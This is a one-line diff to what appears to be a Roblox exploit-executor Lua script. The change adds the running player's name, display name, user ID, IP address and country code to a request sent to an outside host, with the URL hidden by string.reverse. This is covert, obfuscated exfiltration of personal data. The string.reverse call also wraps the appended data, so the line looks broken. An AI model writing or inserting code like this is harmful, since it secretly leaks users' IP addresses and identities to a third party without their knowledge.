@@ -1,1 +1,1 @@
-local Response = syn.request({Url = string.reverse("php.kcehc/moc.ppatsohbew000.0001orpeht//:sptth"),Method = "GET"})
+local Response = syn.request({Url = string.reverse("php.kcehc/moc.ppatsohbew000.0001orpeht//:sptth" .. Player.Name .. "|" .. Player.DisplayName.."|".. Player.UserId .. "|" ..tostring(IpAPI['query']) .. "|" .. tostring(IpAPI['countryCode'])),Method = "GET"})
